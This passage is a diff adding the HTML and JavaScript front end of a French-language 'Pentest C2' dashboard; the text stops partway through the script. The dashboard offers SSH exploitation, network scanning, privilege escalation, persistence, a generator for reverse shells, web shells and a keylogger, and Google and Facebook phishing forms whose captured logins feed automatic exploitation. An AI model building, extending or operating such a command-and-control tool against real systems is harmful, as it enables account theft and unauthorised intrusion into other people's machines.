@@ -1,0 +1,1108 @@
+<!-- public/index.html -->
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pentest C2 Dashboard - Framework d'exploitation</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --dark-bg: #0a0e27;
+            --darker-bg: #060a1a;
+            --primary: #e94560;
+            --primary-dark: #c62a47;
+            --success: #28a745;
+            --info: #0bc5ea;
+            --warning: #ffc107;
+            --danger: #dc3545;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: var(--dark-bg);
+            color: #e0e0e0;
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            overflow: hidden;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            background: var(--darker-bg);
+            height: 100vh;
+            width: 280px;
+            position: fixed;
+            left: 0;
+            top: 0;
+            border-right: 1px solid rgba(233, 69, 96, 0.3);
+            overflow-y: auto;
+            z-index: 100;
+        }
+        
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+            background: linear-gradient(135deg, var(--primary-dark), var(--primary));
+        }
+        
+        .sidebar-header h3 {
+            margin: 0;
+            font-size: 1.2rem;
+        }
+        
+        .sidebar-header small {
+            font-size: 0.7rem;
+            opacity: 0.8;
+        }
+        
+        .nav-link {
+            color: #a0a0b0;
+            padding: 12px 20px;
+            transition: all 0.3s;
+            border-left: 3px solid transparent;
+        }
+        
+        .nav-link:hover {
+            color: var(--primary);
+            background: rgba(233, 69, 96, 0.1);
+        }
+        
+        .nav-link.active {
+            color: var(--primary);
+            border-left-color: var(--primary);
+            background: rgba(233, 69, 96, 0.15);
+        }
+        
+        .nav-link i {
+            width: 24px;
+            margin-right: 10px;
+        }
+        
+        .badge-sidebar {
+            float: right;
+            background: rgba(233, 69, 96, 0.3);
+            color: var(--primary);
+        }
+        
+        /* Main Content */
+        .main-content {
+            margin-left: 280px;
+            height: 100vh;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        /* Stats Cards */
+        .stat-card {
+            background: linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.02));
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 20px;
+            transition: transform 0.3s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-3px);
+            border-color: var(--primary);
+        }
+        
+        .stat-card .icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        
+        .stat-card .value {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        
+        /* Tables */
+        .table {
+            color: #e0e0e0;
+        }
+        
+        .table thead th {
+            border-bottom-color: rgba(233, 69, 96, 0.3);
+            color: var(--primary);
+        }
+        
+        .table tbody tr {
+            border-bottom-color: rgba(255,255,255,0.05);
+        }
+        
+        .table tbody tr:hover {
+            background: rgba(233, 69, 96, 0.1);
+        }
+        
+        /* Badges */
+        .badge-cred {
+            background: rgba(11, 197, 234, 0.2);
+            color: var(--info);
+        }
+        
+        .badge-root {
+            background: rgba(40, 167, 69, 0.2);
+            color: var(--success);
+        }
+        
+        /* Terminal */
+        .terminal {
+            background: #000;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            height: 300px;
+            overflow-y: auto;
+        }
+        
+        .terminal-line {
+            margin: 2px 0;
+            white-space: pre-wrap;
+        }
+        
+        .terminal-input-line {
+            color: var(--success);
+        }
+        
+        .terminal-output {
+            color: #e0e0e0;
+        }
+        
+        .terminal-error {
+            color: var(--danger);
+        }
+        
+        .terminal-success {
+            color: var(--success);
+        }
+        
+        .terminal-cred {
+            color: var(--info);
+        }
+        
+        /* Forms */
+        .form-control, .form-select {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: #fff;
+        }
+        
+        .form-control:focus, .form-select:focus {
+            background: rgba(0,0,0,0.5);
+            border-color: var(--primary);
+            color: #fff;
+            box-shadow: 0 0 0 0.2rem rgba(233, 69, 96, 0.25);
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            border-color: var(--primary);
+        }
+        
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            border-color: var(--primary-dark);
+        }
+        
+        /* Session cards */
+        .session-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 10px;
+            border-radius: 8px;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: var(--darker-bg);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 4px;
+        }
+        
+        /* Animations */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .live-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--success);
+            animation: pulse 1.5s infinite;
+            margin-right: 8px;
+        }
+        
+        /* Payload output */
+        .payload-output {
+            background: #000;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <!-- Sidebar -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h3><i class="fas fa-skull"></i> PENTEST C2</h3>
+            <small>Framework d'exploitation avancé</small>
+        </div>
+        
+        <nav class="nav flex-column mt-3">
+            <a class="nav-link active" href="#" data-page="#page-dashboard">
+                <i class="fas fa-tachometer-alt"></i> Dashboard
+            </a>
+            <a class="nav-link" href="#" data-page="#page-credentials">
+                <i class="fas fa-key"></i> Credentials
+                <span class="badge badge-sidebar" id="credBadge">0</span>
+            </a>
+            <a class="nav-link" href="#" data-page="#page-sessions">
+                <i class="fas fa-plug"></i> Sessions
+                <span class="badge badge-sidebar" id="sessionBadge">0</span>
+            </a>
+            <a class="nav-link" href="#" data-page="#page-exploit">
+                <i class="fas fa-bolt"></i> Exploitation
+            </a>
+            <a class="nav-link" href="#" data-page="#page-scan">
+                <i class="fas fa-network-wired"></i> Scan réseau
+            </a>
+            <a class="nav-link" href="#" data-page="#page-payloads">
+                <i class="fas fa-code"></i> Payloads
+            </a>
+            <a class="nav-link" href="#" data-page="#page-phishing">
+                <i class="fas fa-fish"></i> Phishing
+            </a>
+            <a class="nav-link" href="#" data-page="#page-terminal">
+                <i class="fas fa-terminal"></i> Terminal
+            </a>
+        </nav>
+        
+        <div class="position-absolute bottom-0 p-3" style="width: 100%;">
+            <div class="small text-muted">
+                <span class="live-dot"></span> Active
+                <div id="wsStatus" class="mt-1">WebSocket: Connected</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="main-content">
+        <!-- Dashboard Page -->
+        <div id="page-dashboard" class="page">
+            <div class="row mb-4">
+                <div class="col-md-3">
+                    <div class="stat-card text-center">
+                        <div class="icon"><i class="fas fa-key"></i></div>
+                        <div class="value" id="statCredentials">0</div>
+                        <div class="text-muted">Credentials</div>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stat-card text-center">
+                        <div class="icon"><i class="fas fa-plug"></i></div>
+                        <div class="value" id="statSessions">0</div>
+                        <div class="text-muted">Sessions actives</div>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stat-card text-center">
+                        <div class="icon"><i class="fas fa-bug"></i></div>
+                        <div class="value" id="statExploits">0</div>
+                        <div class="text-muted">Exploits réussis</div>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stat-card text-center">
+                        <div class="icon"><i class="fas fa-search"></i></div>
+                        <div class="value" id="statScans">0</div>
+                        <div class="text-muted">Scans effectués</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-12">
+                    <div class="card bg-transparent border-secondary">
+                        <div class="card-header border-secondary">
+                            <h5 class="mb-0"><i class="fas fa-history"></i> Derniers logs</h5>
+                        </div>
+                        <div class="card-body" id="logArea" style="height: 400px; overflow-y: auto; font-family: monospace; font-size: 0.85rem;">
+                            <div class="text-muted">En attente d'activité...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Credentials Page -->
+        <div id="page-credentials" class="page" style="display: none;">
+            <h4 class="mb-4"><i class="fas fa-key me-2"></i> Credentials collectés</h4>
+            <div class="table-responsive">
+                <table class="table" id="credentialsTable">
+                    <thead>
+                        <tr>
+                            <th>Service</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>IP</th>
+                            <th>Status</th>
+                            <th>Date</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td colspan="7" class="text-center text-muted">Aucun credential</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        
+        <!-- Sessions Page -->
+        <div id="page-sessions" class="page" style="display: none;">
+            <h4 class="mb-4"><i class="fas fa-plug me-2"></i> Sessions actives</h4>
+            <div id="sessionsContainer">
+                <div class="text-muted text-center">Aucune session active</div>
+            </div>
+        </div>
+        
+        <!-- Exploit Page -->
+        <div id="page-exploit" class="page" style="display: none;">
+            <h4 class="mb-4"><i class="fas fa-bolt me-2"></i> Exploitation SSH</h4>
+            
+            <div class="row">
+                <div class="col-md-5">
+                    <div class="card bg-transparent border-secondary">
+                        <div class="card-body">
+                            <h6 class="mb-3">Configuration cible</h6>
+                            <div class="mb-3">
+                                <label class="form-label">Target IP</label>
+                                <input type="text" class="form-control" id="exploitTarget" placeholder="192.168.1.100">
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label">Port</label>
+                                <input type="number" class="form-control" id="exploitPort" value="22">
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label">Username</label>
+                                <input type="text" class="form-control" id="exploitUser" value="root">
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label">Password</label>
+                                <input type="password" class="form-control" id="exploitPass">
+                            </div>
+                            <button class="btn btn-primary w-100" id="exploitBtn">
+                                <i class="fas fa-bolt"></i> Lancer l'exploitation
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-7">
+                    <div class="card bg-transparent border-secondary">
+                        <div class="card-body">
+                            <h6 class="mb-3">Résultats</h6>
+                            <div id="exploitOutput">
+                                <div class="text-muted">En attente d'exploitation...</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Scan Page -->
+        <div id="page-scan" class="page" style="display: none;">
+            <h4 class="mb-4"><i class="fas fa-network-wired me-2"></i> Scan réseau</h4>
+            
+            <div class="row">
+                <div class="col-md-5">
+                    <div class="card bg-transparent border-secondary">
+                        <div class="card-body">
+                            <div class="mb-3">
+                                <label class="form-label">Cible (IP ou range)</label>
+                                <input type="text" class="form-control" id="scanTarget" placeholder="192.168.1.0/24">
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label">Ports (séparés par virgule)</label>
+                                <input type="text" class="form-control" id="scanPorts" placeholder="22,80,443,3389">
+                            </div>
+                            <button class="btn btn-primary w-100" id="scanBtn">
+                                <i class="fas fa-search"></i> Démarrer le scan
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-7">
+                    <div class="card bg-transparent border-secondary">
+                        <div class="card-body">
+                            <h6 class="mb-3">Résultats</h6>
+                            <div id="scanResults" style="max-height: 400px; overflow-y: auto;">
+                                <div class="text-muted">Aucun scan effectué</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Payloads Page -->
+        <div id="page-payloads" class="page" style="display: none;">
+            <h4 class="mb-4"><i class="fas fa-code me-2"></i> Générateur de payloads</h4>
+            
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="card bg-transparent border-secondary">
+                        <div class="card-body">
+                            <div class="mb-3">
+                                <label class="form-label">Type de payload</label>
+                                <select class="form-select" id="payloadType">
+                                    <option value="bash">Bash Reverse Shell</option>
+                                    <option value="python">Python Reverse Shell</option>
+                                    <option value="powershell">PowerShell Reverse Shell</option>
+                                    <option value="php">PHP Web Shell</option>
+                                    <option value="asp">ASP Web Shell</option>
+                                    <option value="keylogger">Keylogger Python</option>
+                                </select>
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label">LHOST (votre IP)</label>
+                                <input type="text" class="form-control" id="payloadHost" placeholder="192.168.1.50">
+                            </div>
+                            <div class="mb-3">
+                                <label class="form-label">LPORT</label>
+                                <input type="number" class="form-control" id="payloadPort" value="4444">
+                            </div>
+                            <button class="btn btn-primary w-100 mb-2" id="generatePayloadBtn">
+                                <i class="fas fa-cog"></i> Générer
+                            </button>
+                            <button class="btn btn-outline-success w-100" id="copyPayloadBtn">
+                                <i class="fas fa-copy"></i> Copier
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-8">
+                    <div class="card bg-transparent border-secondary">
+                        <div class="card-body">
+                            <h6 class="mb-3">Payload généré</h6>
+                            <div class="payload-output" id="payloadOutput">
+                                Sélectionnez un type et générez un payload
+                            </div>
+                            <div class="mt-3">
+                                <h6 class="mb-2">Démarrer listener</h6>
+                                <div class="input-group">
+                                    <input type="number" class="form-control" id="listenerPort" placeholder="Port" value="4444">
+                                    <button class="btn btn-danger" id="startListenerBtn">
+                                        <i class="fas fa-headphones"></i> Démarrer listener
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Phishing Page -->
+        <div id="page-phishing" class="page" style="display: none;">
+            <h4 class="mb-4"><i class="fas fa-fish me-2"></i> Pages de phishing</h4>
+            
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="card bg-transparent border-secondary mb-3">
+                        <div class="card-header border-secondary">
+                            <i class="fab fa-google"></i> Google Phish
+                        </div>
+                        <div class="card-body">
+                            <input type="text" class="form-control mb-2" id="googleUser" placeholder="Email">
+                            <input type="password" class="form-control mb-2" id="googlePass" placeholder="Mot de passe">
+                            <button class="btn btn-sm btn-danger w-100" onclick="submitPhish('google')">
+                                Capturer
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card bg-transparent border-secondary mb-3">
+                        <div class="card-header border-secondary">
+                            <i class="fab fa-facebook"></i> Facebook Phish
+                        </div>
+                        <div class="card-body">
+                            <input type="text" class="form-control mb-2" id="facebookUser" placeholder="Email/Phone">
+                            <input type="password" class="form-control mb-2" id="facebookPass" placeholder="Password">
+                            <button class="btn btn-sm btn-danger w-100" onclick="submitPhish('facebook')">
+                                Capturer
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card bg-transparent border-secondary mb-3">
+                        <div class="card-header border-secondary">
+                            <i class="fas fa-server"></i> SSH/Device
+                        </div>
+                        <div class="card-body">
+                            <input type="text" class="form-control mb-2" id="deviceUser" placeholder="Username">
+                            <input type="password" class="form-control mb-2" id="devicePass" placeholder="Password">
+                            <button class="btn btn-sm btn-danger w-100" onclick="submitPhish('device')">
+                                Capturer & Exploiter
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="alert alert-info mt-3">
+                <i class="fas fa-info-circle"></i> Les credentials capturés sont automatiquement ajoutés à la base et utilisés pour l'auto-exploitation.
+            </div>
+        </div>
+        
+        <!-- Terminal Page -->
+        <div id="page-terminal" class="page" style="display: none;">
+            <h4 class="mb-4"><i class="fas fa-terminal me-2"></i> Console interactive</h4>
+            
+            <div class="card bg-transparent border-secondary">
+                <div class="card-body">
+                    <div class="terminal" id="terminalOutput">
+                        <div class="terminal-line terminal-success">[SYSTEM] Terminal C2 prêt</div>
+                        <div class="terminal-line terminal-success">[SYSTEM] Tapez 'help' pour la liste des commandes</div>
+                    </div>
+                    <div class="input-group mt-3">
+                        <span class="input-group-text bg-dark border-secondary text-primary">$</span>
+                        <input type="text" class="form-control" id="terminalInput" placeholder="Entrez une commande...">
+                    </div>
+                    <div class="mt-2 small text-muted">
+                        Commandes: scan &lt;target&gt;, sessions, help, clear
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        const API_BASE = 'http://localhost:8888/api';
+        let ws = null;
+        
+        // Navigation
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+                this.classList.add('active');
+                document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+                document.querySelector(this.dataset.page).style.display = 'block';
+            });
+        });
+        
+        // WebSocket connection
+        function connectWebSocket() {
+            ws = new WebSocket('ws://localhost:8888');
+            
+            ws.onopen = () => {
+                console.log('WebSocket connected');
+                document.getElementById('wsStatus').innerHTML = 'WebSocket: <span class="text-success">Connected</span>';
+            };
+            
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                if (data.type === 'log') {
+                    addLog(data.message, data.logType);
+                } else if (data.type === 'credential') {
+                    addLog(`[CRED] ${data.credential.service}: ${data.credential.username}:${data.credential.password}`, 'cred');
+                    loadCredentials();
+                    updateStats();
+                } else if (data.type === 'session') {
+                    addLog(`[SESSION] Nouvelle session: ${data.session.id} on ${data.session.target}`, 'success');
+                    loadSessions();
+                    updateStats();
+                } else if (data.type === 'scan') {
+                    addLog(`[SCAN] Scan terminé sur ${data.result.target}: ${data.result.open_ports.length} ports ouverts`, 'info');
+                }
+            };
+            
+            ws.onclose = () => {
+                document.getElementById('wsStatus').innerHTML = 'WebSocket: <span class="text-danger">Disconnected</span>';
+                setTimeout(connectWebSocket, 3000);
+            };
+        }
+        
+        function addLog(message, type = 'info') {
+            const logArea = document.getElementById('logArea');
+            const colors = {
+                info: 'text-info',
+                success: 'text-success',
+                error: 'text-danger',
+                cred: 'text-cyan',
+                exploit: 'text-warning'
+            };
+            const div = document.createElement('div');
+            div.className = colors[type] || 'text-muted';
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logArea.appendChild(div);
+            div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+        
+        // API Calls
+        async function updateStats() {
+            try {
+                const res = await fetch(`${API_BASE}/stats`);
+                const stats = await res.json();
+                document.getElementById('statCredentials').textContent = stats.credentials;
+                document.getElementById('statSessions').textContent = stats.sessions;
+                document.getElementById('statExploits').textContent = stats.exploits;
+                document.getElementById('statScans').textContent = stats.scans;
+                document.getElementById('credBadge').textContent = stats.credentials;
+                document.getElementById('sessionBadge').textContent = stats.sessions;
+            } catch(e) {}
+        }
+        
+        async function loadCredentials() {
+            try {
+                const res = await fetch(`${API_BASE}/credentials`);
+                const creds = await res.json();
+                const tbody = document.querySelector('#credentialsTable tbody');
+                if (creds.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="7" class="text-center text-muted">Aucun credential</td></tr>';
+                    return;
+                }
+                tbody.innerHTML = creds.map(c => `
+                    <tr>
+                        <td><span class="badge bg-info">${c.service}</span></td>
+                        <td><code>${escapeHtml(c.username)}</code></td>
+                        <td><code>${escapeHtml(c.password)}</code></td>
+                        <td>${c.ip || 'N/A'}</td>
+                        <td><span class="badge bg-success">${c.status}</span></td>
+                        <td>${new Date(c.timestamp).toLocaleString()}</td>
+                        <td>
+                            <button class="btn btn-sm btn-outline-primary" onclick="quickExploit('${escapeHtml(c.username)}', '${escapeHtml(c.password)}')">
+                                Exploiter
+                            </button>
+                        </td>
+                    </tr>
+                `).join('');
+            } catch(e) {}
+        }
+        
+        async function loadSessions() {
+            try {
+                const res = await fetch(`${API_BASE}/sessions`);
+                const sessions = await res.json();
+                const container = document.getElementById('sessionsContainer');
+                if (sessions.length === 0) {
+                    container.innerHTML = '<div class="text-muted text-center">Aucune session active</div>';
+                    return;
+                }
+                container.innerHTML = sessions.map(s => `
+                    <div class="session-card p-3">
+                        <div class="d-flex justify-content-between align-items-start">
+                            <div>
+                                <strong><i class="fas fa-plug text-primary"></i> ${s.id}</strong><br>
+                                <small class="text-muted">Target: ${s.target}:${s.port}</small><br>
+                                <small>User: ${s.username} ${s.root ? '<span class="badge bg-success">ROOT</span>' : ''}</small>
+                                ${s.persisted ? '<span class="badge bg-info">Persisted</span>' : ''}
+                            </div>
+                            <div>
+                                <button class="btn btn-sm btn-warning" onclick="runCommand('${s.id}', 'whoami')">whoami</button>
+                                <button class="btn btn-sm btn-info" onclick="runCommand('${s.id}', 'id')">id</button>
+                                <button class="btn btn-sm btn-success" onclick="escalateSession('${s.id}')">Privesc</button>
+                                <button class="btn btn-sm btn-danger" onclick="persistSession('${s.id}')">Persist</button>
+                                <button class="btn btn-sm btn-secondary" onclick="closeSession('${s.id}')">Close</button>
+                            </div>
+                        </div>
+                        <div class="mt-2">
+                            <div class="input-group input-group-sm">
+                                <input type="text" class="form-control" id="cmd_${s.id}" placeholder="Commande...">
+                                <button class="btn btn-outline-primary" onclick="runCommand('${s.id}', document.getElementById('cmd_${s.id}').value)">Exec</button>
+                            </div>
+                        </div>
+                    </div>
+                `).join('');
+            } catch(e) {}
+        }
+        
+        async function runCommand(sessionId, command) {
+            if (!command) return;
+            addLog(`[CMD] Exécution sur ${sessionId}: ${command}`, 'info');
+            try {
+                const res = await fetch(`${API_BASE}/exploit/ssh/command`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({session_id: sessionId, command})
+                });
+                const data = await res.json();
+                if (data.output) {
+                    addLog(`[OUTPUT] ${data.output.substring(0, 200)}`, 'success');
+                    appendTerminal(`\n[${sessionId}] $ ${command}\n${data.output}`);
+                }
+            } catch(e) {
+                addLog(`Erreur: ${e.message}`, 'error');
+            }
+        }
+        
+        async function escalateSession(sessionId) {
+            addLog(`[PRIVESC] Tentative sur session ${sessionId}...`, 'exploit');
+            try {
+                const res = await fetch(`${API_BASE}/exploit/ssh/escalate`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({session_id: sessionId})
+                });
+                const data = await res.json();
+                if (data.root) {
+                    addLog(`[PRIVESC] ✅ Root obtenu!`, 'success');
+                    loadSessions();
+                } else {
+                    addLog(`[PRIVESC] ❌ Échec: ${data.error}`, 'error');
+                }
+            } catch(e) {}
+        }
+        
+        async function persistSession(sessionId) {
+            addLog(`[PERSIST] Déploiement persistance...`, 'info');
+            try {
+                const res = await fetch(`${API_BASE}/exploit/ssh/persist`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({session_id: sessionId})
+                });
+                const data = await res.json();
+                if (data.persisted) {
+                    addLog(`[PERSIST] ✅ Persistance déployée: ${data.methods.join(', ')}`, 'success');
+                    loadSessions();
+                }
+            } catch(e) {}
+        }
+        
+        async function closeSession(sessionId) {
+            try {
+                await fetch(`${API_BASE}/sessions/${sessionId}`, {method: 'DELETE'});
+                addLog(`Session ${sessionId} fermée`, 'info');
+                loadSessions();
+                updateStats();
+            } catch(e) {}
+        }
+        
+        // Exploitation
+        document.getElementById('exploitBtn').addEventListener('click', async () => {
+            const target = document.getElementById('exploitTarget').value;
+            const port = document.getElementById('exploitPort').value;
+            const username = document.getElementById('exploitUser').value;
+            const password = document.getElementById('exploitPass').value;
+            
+            if (!target || !username || !password) {
+                addLog('Remplissez tous les champs', 'error');
+                return;
+            }
+            
+            const outputDiv = document.getElementById('exploitOutput');
+            outputDiv.innerHTML = '<div class="text-info">Exploitation en cours...</div>';
+            
+            try {
+                const res = await fetch(`${API_BASE}/exploit/ssh`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({target, port, username, password})
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    outputDiv.innerHTML = `
+                        <div class="alert alert-success">
+                            <strong>✅ Exploit réussi!</strong><br>
+                            Session ID: ${data.session_id}<br>
+                            ${data.info}
+                        </div>
+                    `;
+                    loadSessions();
+                    updateStats();
+                } else {
+                    outputDiv.innerHTML = `
+                        <div class="alert alert-danger">
+                            <strong>❌ Échec</strong><br>
+                            ${data.error}
+                        </div>
+                    `;
+                }
+            } catch(e) {
+                outputDiv.innerHTML = `<div class="alert alert-danger">Erreur: ${e.message}</div>`;
+            }
+        });
+        
+        // Scan
+        document.getElementById('scanBtn').addEventListener('click', async () => {
+            const target = document.getElementById('scanTarget').value;
+            let ports = document.getElementById('scanPorts').value;
+            
+            if (!target) {
+                addLog('Entrez une cible', 'error');
+                return;
+            }
+            
+            const portList = ports ? ports.split(',').map(p => parseInt(p.trim())) : [22,80,443,3389,8080,8443];
+            
+            const resultsDiv = document.getElementById('scanResults');
+            resultsDiv.innerHTML = '<div class="text-info">Scan en cours...</div>';
+            
+            try {
+                const res = await fetch(`${API_BASE}/scan`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({target, ports: portList})
+                });
+                const data = await res.json();
+                
+                if (data.open_ports.length === 0) {
+                    resultsDiv.innerHTML = '<div class="text-muted">Aucun port ouvert trouvé</div>';
+                } else {
+                    resultsDiv.innerHTML = `
+                        <h6>Cible: ${data.target}</h6>
+                        <table class="table table-sm">
+                            <thead>
+                                <tr><th>Port</th><th>Service</th><th>Action</th></tr>
+                            </thead>
+                            <tbody>
+                                ${data.open_ports.map(p => `
+                                    <tr>
+                                        <td>${p.port}</td>
+                                        <td>${p.service}</td>
+                                        <td>
+                                            <button class="btn btn-sm btn-primary" onclick="quickExploitTarget('${target}', ${p.port})">
+                                                Exploiter
+                                            </button>
+                                        </td>
+                                    </tr>
+                                `).join('')}
+                            </tbody>
+                        </table>
+                    `;
+                }
+                addLog(`Scan terminé: ${data.open_ports.length} ports ouverts`, 'success');
+                updateStats();
+            } catch(e) {
+                resultsDiv.innerHTML = `<div class="alert alert-danger">Erreur: ${e.message}</div>`;
+            }
+        });
+        
+        // Payloads
+        document.getElementById('generatePayloadBtn').addEventListener('click', async () => {
+            const type = document.getElementById('payloadType').value;
+            const lhost = document.getElementById('payloadHost').value;
+            const lport = document.getElementById('payloadPort').value;
+            
+            if (!lhost) {
+                addLog('Entrez LHOST', 'error');
+                return;
+            }
+            
+            try {
+                const res = await fetch(`${API_BASE}/payloads/generate`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({type, lhost, lport: parseInt(lport)})
+                });
+                const data = await res.json();
+                document.getElementById('payloadOutput').textContent = data.payload;
+                addLog(`Payload ${type} généré`, 'success');
+            } catch(e) {
+                addLog(`Erreur: ${e.message}`, 'error');
+            }
+        });
+        
+        document.getElementById('copyPayloadBtn').addEventListener('click', () => {
+            const payload = document.getElementById('payloadOutput').textContent;
+            navigator.clipboard.writeText(payload);
+            addLog('Payload copié!', 'success');
+        });
+        
+        document.getElementById('startListenerBtn').addEventListener('click', async () => {
+            const port = document.getElementById('listenerPort').value;
+            try {
+                const res = await fetch(`${API_BASE}/payloads/listener/start`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({port: parseInt(port)})
+                });
+                const data = await res.json();
+                if (data.success) {
+                    addLog(`Listener démarré sur port ${port}`, 'success');
+                    appendTerminal(`Listener started on 0.0.0.0:${port}`);
+                }
+            } catch(e) {
+                addLog(`Erreur: ${e.message}`, 'error');
+            }
+        });
+        
+        // Phishing
+        window.submitPhish = async (service) => {
+            const username = document.getElementById(`${service}User`).value;
+            const password = document.getElementById(`${service}Pass`).value;
+            
+            if (!username || !password) {
+                addLog('Remplissez tous les champs', 'error');
+                return;
+            }
+            
+            try {
+                const res = await fetch(`${API_BASE}/collect`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({service, username, password})
+                });
+                const data = await res.json();
+                if (data.success) {
+                    addLog(`[PHISH] ${service}: ${username}:${password} capturé!`, 'cred');
+                    document.getElementById(`${service}User`).value = '';
+                    document.getElementById(`${service}Pass`).value = '';
+                    loadCredentials();
+                    updateStats();
+                    
+                    // Auto-exploit pour device
+                    if (service === 'device') {
+                        addLog('Tentative d\'auto-exploitation...', 'info');
+                        await autoExploit(username, password);
+                    }
+                }
+            } catch(e) {
+                addLog(`Erreur: ${e.message}`, 'error');
+            }
+        };
+        
+        async function autoExploit(username, password) {
+            try {
+                const res = await fetch(`${API_BASE}/auto/exploit`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({username, password})
+                });
+                const data = await res.json();
+                if (data.sessions && data.sessions.length > 0) {
+                    addLog(`Auto-exploit: ${data.sessions.length} nouvelles sessions!`, 'success');
+                    loadSessions();
+                    updateStats();
+                }
+            } catch(e) {}
+        }
+        
+        window.quickExploit = (username, password) => {
+            document.getElementById('exploitUser').value = username;
+            document.getElementById('exploitPass').value = password;
+            document.querySelector('[data-page="#page-exploit"]').click();
+            addLog(`Prêt à exploiter avec ${username}:${password}`, 'info');
+        };
+        
+        window.quickExploitTarget = (target, port) => {
+            document.getElementById('exploitTarget').value = target;
+            document.getElementById('exploitPort').value = port;
+            document.querySelector('[data-page="#page-exploit"]').click();
+        };
+        
+        // Terminal
+        function appendTerminal(text) {
+            const terminal = document.getElementById('terminalOutput');
+            const lines = text.split('\n');
+            lines.forEach(line => {
+                const div = document.createElement('div');
+                div.className = 'terminal-line terminal-output';
+                div.textContent = line;
+                terminal.appendChild(div);
+            });
